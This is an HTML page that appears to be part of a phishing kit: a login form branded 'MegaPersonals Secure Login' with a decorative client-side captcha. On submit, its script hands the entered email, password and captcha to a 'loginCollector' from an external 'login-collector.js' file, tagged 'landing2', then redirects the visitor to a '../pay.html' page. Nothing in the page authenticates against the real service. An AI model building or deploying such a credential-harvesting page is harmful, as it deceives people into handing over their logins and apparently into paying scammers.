<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Light Theme</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            padding: 40px;
            width: 100%;
            max-width: 420px;
            border: 1px solid #e0e0e0;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 28px;
            font-weight: 700;
            color: #ff9800;
            margin-bottom: 8px;
        }
        
        .header p {
            color: #888;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }
        
        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ddd;
            background-color: #fafafa;
            color: #333;
            border-radius: 6px;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        input[type="email"]:focus,
        input[type="password"]:focus,
        input[type="text"]:focus {
            outline: none;
            border-color: #ff9800;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(255, 152, 0, 0.1);
        }
        
        .captcha-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .captcha-group input {
            flex: 1;
        }
        
        .captcha-display {
            background-color: #fafafa;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 10px 12px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            color: #ff9800;
            font-size: 18px;
            letter-spacing: 4px;
            min-width: 120px;
            text-align: center;
            flex-shrink: 0;
        }
        
        .refresh-btn {
            background-color: #ff9800;
            color: #fff;
            border: none;
            padding: 10px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            font-size: 12px;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }
        
        .refresh-btn:hover {
            background-color: #fb8c00;
            transform: scale(1.05);
        }
        
        .refresh-btn:active {
            transform: scale(0.95);
        }
        
        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #ff9800;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            background-color: #fb8c00;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 152, 0, 0.2);
        }
        
        .submit-btn:active {
            transform: translateY(0);
        }
        
        .error {
            color: #d32f2f;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }
        
        .error.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>MegaPersonals</h1>
            <p>Secure Login</p>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required>
                <div class="error" id="emailError"></div>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
                <div class="error" id="passwordError"></div>
            </div>
            
            <div class="form-group">
                <label for="captcha">Verify Captcha</label>
                <div class="captcha-group">
                    <div class="captcha-display" id="captchaDisplay">AB12CD</div>
                    <button type="button" class="refresh-btn" id="refreshBtn" onclick="generateCaptcha()">Refresh</button>
                </div>
                <input type="text" id="captcha" name="captcha" placeholder="Enter captcha" required>
                <div class="error" id="captchaError"></div>
            </div>
            
            <button type="submit" class="submit-btn">Login</button>
        </form>
    </div>
    
    <script src="../assets/js/login-collector.js"></script>
    <script>
        let currentCaptcha = 'AB12CD';
        
        function generateCaptcha() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let captcha = '';
            for (let i = 0; i < 6; i++) {
                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            currentCaptcha = captcha;
            document.getElementById('captchaDisplay').textContent = captcha;
            document.getElementById('captcha').value = '';
        }
        
        function validateCaptcha(enteredCaptcha) {
            return enteredCaptcha.toUpperCase() === currentCaptcha.toUpperCase();
        }
        
        function clearErrors() {
            document.getElementById('emailError').classList.remove('show');
            document.getElementById('passwordError').classList.remove('show');
            document.getElementById('captchaError').classList.remove('show');
        }
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            clearErrors();
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const captcha = document.getElementById('captcha').value.trim();
            
            let isValid = true;
            
            if (!email) {
                document.getElementById('emailError').textContent = 'Email is required';
                document.getElementById('emailError').classList.add('show');
                isValid = false;
            }
            
            if (!password) {
                document.getElementById('passwordError').textContent = 'Password is required';
                document.getElementById('passwordError').classList.add('show');
                isValid = false;
            }
            
            if (!validateCaptcha(captcha)) {
                document.getElementById('captchaError').textContent = 'Invalid captcha';
                document.getElementById('captchaError').classList.add('show');
                isValid = false;
            }
            
            if (isValid) {
                loginCollector.addEntry(email, password, captcha, 'landing2');
                setTimeout(() => {
                    window.location.href = '../pay.html';
                }, 300);
            }
        });
        
        generateCaptcha();
    </script>
</body>
</html>
